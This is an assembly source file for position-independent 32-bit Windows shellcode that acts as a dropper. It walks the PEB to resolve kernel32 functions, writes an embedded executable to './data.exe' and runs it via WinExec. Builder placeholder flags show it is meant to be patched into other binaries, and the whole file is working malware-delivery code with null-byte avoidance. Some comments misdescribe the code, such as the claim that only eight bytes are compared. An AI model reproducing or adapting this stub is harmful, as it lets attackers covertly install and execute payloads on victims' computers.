; shellcode.asm
; nasm shellcode.asm -f bin -o shellcode.bin
; Position independant shellcode which writes a buffer of bytes (an embedded PE) out to a new file 
; and executes it silently.

    bits 32
    default rel

section .text
    global start
start:
    ; Save all registers
    push eax
    push ebx
    push ecx
    push edx
    push esi
    push edi
    push ebp

    ; New stack frame
    push ebp
    mov ebp, esp

    ; Local vars
    sub esp, 0x44

    ; Walk the TEB AND PEB to find GetProcAddress and LoadLibraryA (kernel32.dll)

    ; Push the function names onto the stack
    xor esi, esi
    push 0x00007373         ; 00ss
    push 0x65726464         ; erdd
    push 0x41636F72         ; Acor
    push 0x50746547         ; PteG
    mov [ebp - 0x4], esp    ; var8 = "GetProcAddress\x00"

    push esi                ; 0
    push 0x41797261         ; Ayra
    push 0x7262694C         ; rbiL
    push 0x64616F4C         ; daoL
    mov [ebp - 0x8], esp    ; var4 = "LoadLibraryA\x00"

    ; Find kernel32.dll base address
	xor esi, esi			; esi = 0
    mov ebx, [fs:0x30 + esi]; written this way to avoid null bytes
	mov ebx, [ebx + 0x0C] 
	mov ebx, [ebx + 0x14] 
	mov ebx, [ebx]	
	mov ebx, [ebx]	
	mov ebx, [ebx + 0x10]   ; ebx holds kernel32.dll base address
	mov [ebp - 0x0C], ebx 	; var12 = kernel32.dll base address

	; Find various addresses within the kernel32.dll PE
	mov eax, [ebx + 0x3C]	; RVA of PE signature
	add eax, ebx       		; Address of PE signature = base address + RVA of PE signature
	mov eax, [eax + 0x78]	; RVA of Export Table
	add eax, ebx 			; Address of Export Table

	mov ecx, [eax + 0x24]	; RVA of Ordinal Table
	add ecx, ebx 			; Address of Ordinal Table
	mov [ebp - 0x10], ecx 	; var16 = Address of Ordinal Table

	mov edi, [eax + 0x20] 	; RVA of Name Pointer Table
	add edi, ebx 			; Address of Name Pointer Table
	mov [ebp - 0x14], edi 	; var20 = Address of Name Pointer Table

	mov edx, [eax + 0x1C] 	; RVA of Address Table
	add edx, ebx 			; Address of Address Table
	mov [ebp - 0x18], edx 	; var24 = Address of Address Table

	mov edx, [eax + 14h] 	; Number of exported functions

    ; Find GetProcAddress
	xor eax, eax 			; counter = 0
find_1:
    mov esi, [ebp - 4]      ; esi = var4 = "GetProcAddress\x00"
    mov edi, [ebp - 0x14] 	    ; edi = var20 = Address of Name Pointer Table
    xor ecx, ecx

    cld  			        ; set DF=0 => process strings from left to right
    mov edi, [edi + eax*4]	; Entries in Name Pointer Table are 4 bytes long
                            ; edi = RVA Nth entry = Address of Name Table * 4
    add edi, ebx       	    ; edi = address of string = base address + RVA Nth entry
    add cx, 15 		        ; Length of strings to compare = len(GetProcAddress\x00) = 15
    repe cmpsb        	    ; Compare the first 8 bytes of strings in 
                            ; esi and edi registers. ZF=1 if equal, ZF=0 if not
    jz found_1

    inc eax 		; counter++
    cmp eax, edx    	; check if last function is reached
    jb find_1 		; if not the last -> loop

    add esp, 0x2A      		
    jmp end 		; if function is not found, jump to end

found_1:
    ; the counter (eax) now holds the position of GetProcAddress

    mov ecx, [ebp - 0x10]	; ecx = var16 = Address of Ordinal Table
    mov edx, [ebp - 0x18]  	; edx = var24 = Address of Address Table

    mov ax, [ecx + eax*2] 	; ax = ordinal number = var16 + (counter * 2)
    mov eax, [edx + eax*4] 	; eax = RVA of function = var24 + (ordinal * 4)
    add eax, ebx 		; eax = address of GetProcAddress = kernel32.dll base address + RVA of GetProcAddress

    mov [ebp - 0x1C], eax   ; var28 = address GetProcAddress

    ; Find LoadLibraryA
    xor eax, eax 			; counter = 0
find_2:
    mov esi, [ebp - 8]      ; esi = var8 = "LoadLibraryA\x00"
    mov edi, [ebp - 0x14] 	    ; edi = var20 = Address of Name Pointer Table
    xor ecx, ecx

    cld  			        ; set DF=0 => process strings from left to right
    mov edi, [edi + eax*4]	; Entries in Name Pointer Table are 4 bytes long
                            ; edi = RVA Nth entry = Address of Name Table * 4
    add edi, ebx       	    ; edi = address of string = base address + RVA Nth entry
    add cx, 13 		        ; Length of strings to compare = len(LoadLibraryA\x00) = 13
    repe cmpsb        	; Compare the first 8 bytes of strings in 
                ; esi and edi registers. ZF=1 if equal, ZF=0 if not
    jz found_2

    inc eax 		; counter++
    cmp eax, edx    	; check if last function is reached
    jb find_2 		; if not the last -> loop

    add esp, 0x2A      		
    jmp end 		; if function is not found, jump to end

found_2:
    ; the counter (eax) now holds the position of LoadLibraryA

    mov ecx, [ebp - 0x10]	; ecx = var16 = Address of Ordinal Table
    mov edx, [ebp - 0x18]  	; edx = var24 = Address of Address Table

    mov ax, [ecx + eax*2] 	; ax = ordinal number = var16 + (counter * 2)
    mov eax, [edx + eax*4] 	; eax = RVA of function = var24 + (ordinal * 4)
    add eax, ebx 		; eax = address of LoadLibraryA = kernel32.dll base address + RVA of LoadLibraryA

    mov [ebp - 0x20], eax   ; var32 = address LoadLibraryA

    ; Load required libraries using LoadLibraryA and GetProcAddress:
    ;   - CreateFileA (kernel32.dll)
    ;   - WriteFile (kernel32.dll)
    ;   - CloseHandle (kernel32.dll)
    ;   - WinExec (kernel32.dll)

    ; LoadLibraryA("kernel32.dll")
    xor edx, edx
    push edx        ; 0
    push 0x6C6C642E ; lld.
    push 0x32336C65 ; 23le
    push 0x6E72656B ; nrek
    mov esi, esp    ; "kernel32.dll\x00"
    push esi
    mov eax, [ebp - 0x20]
    call eax
    cmp eax, 0
    ; jz      error
    mov [ebp - 0x24], eax   ; var34 = handle to loaded kernel32.dll library

    ; Load CreateFileA
    xor edx, edx
    push 0x0041656C ;0Ael
    push 0x69466574 ;iFet
    push 0x61657243 ;aerC
    mov esi, esp    ; "CreateFileA\x00"
    push esi
    mov edx, [ebp - 0x24]
    push edx
    mov eax, [ebp - 0x1C]
    call eax
    cmp eax, 0
    ; jz      error
    mov [ebp - 0x28], eax   ; var38 = CreateFileA function

    ; Load WriteFile
    xor edx, edx
    push 0x00000065 ; 000e
    push 0x6C694665 ; liFe
    push 0x74697257 ; tirW
    mov esi, esp    ; "WriteFile\x00"
    push esi
    mov edx, [ebp - 0x24]
    push edx
    mov eax, [ebp - 0x1C]
    call eax
    cmp eax, 0
    ; jz      error
    mov [ebp - 0x2C], eax   ; var42 = WriteFile function

    ; Load CloseHandle
    xor edx, edx
    push 0x00656C64 ; 0eld
    push 0x6E614865 ; naHe
    push 0x736F6C43 ; solC
    mov esi, esp    ; "CloseHandle\x00"
    push esi
    mov edx, [ebp - 0x24]
    push edx
    mov eax, [ebp - 0x1C]
    call eax
    cmp eax, 0
    ; jz      error
    mov [ebp - 0x30], eax   ; var46 = CloseHandle function

    ; Load WinExec
    xor edx, edx
	push 0x00636578 ; 0cex
	push 0x456e6957 ; EniW
    mov esi, esp    ; "WinExec\x00"
    push esi
    mov eax, [ebp - 0x24]
    push eax
    mov eax, [ebp - 0x1C]
    call eax
    cmp eax, 0
    mov [ebp - 0x34], eax   ; var50 = WinExec function

    xor edx, edx
    ; FILENAME_FLAG -- used by builder to optionally modify with an alternate filename
    push 0x00006578 ; 00ex
    push 0x652E6174 ; e.at
    push 0x61642F2E ; ad/.
    mov eax, esp
    mov [ebp - 0x38], esp   ; var54 = New filename

    ; Use CreateFileA to create a new file
    push 0               ; hTemplateFile
    push dword 0x80      ; dwFlagsAndAttributes
    push dword 2         ; dwCreationDisposition
    push 0               ; lpSecurityAttributes
    push dword 0         ; dwShareMode
    push dword 0x10000000; dwDesiredAccess
    push eax             ; lpFileName
    mov eax, [ebp - 0x28]
    call eax
    cmp eax, 0
    mov [ebp - 0x3C], eax   ; var58 = New file handle

    ; Use WriteFile to write out to the file
    push    dword 0             ; LPOVERLAPPED lpOverlapped
    ; mov eax, [ebp - 0x40]
    mov eax, ebp
    sub eax, 0x40
    push eax                    ; LPDWORD lpNumberOfBytesWritten
    ; SIZE_FLAG -- used by builder to modify with the correct size
    push dword 0x004CE0B8       ; DWORD nNumberOfBytesToWrite
    ; LOCATION_FLAG -- used by builder to modify with the correct address of embedded code
    push dword 0x00408600       ; LPCVOID lpBuffer
    mov eax, [ebp - 0x3C]
    push eax                    ; HANDLE hFile
    mov eax, [ebp - 0x2C]
    call eax
    cmp eax, 0

    ; Use CloseHandle to close the file handle
    mov eax, [ebp - 0x3C]
    push eax                    ; HANDLE hFile
    mov eax, [ebp - 0x30]
    call eax
    cmp     eax, 0

    ; Use WinExec
    push 0x10                   ; DWORD uCmdShow
    mov eax, [ebp - 0x38]
    push eax                    ; LPCVOID lpCmdLine
    mov eax, [ebp - 0x34]
    call eax

    add esp, 0xB0

end:
    ; restore all registers and exit
    pop ebp
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    pop eax
    
    nop
    nop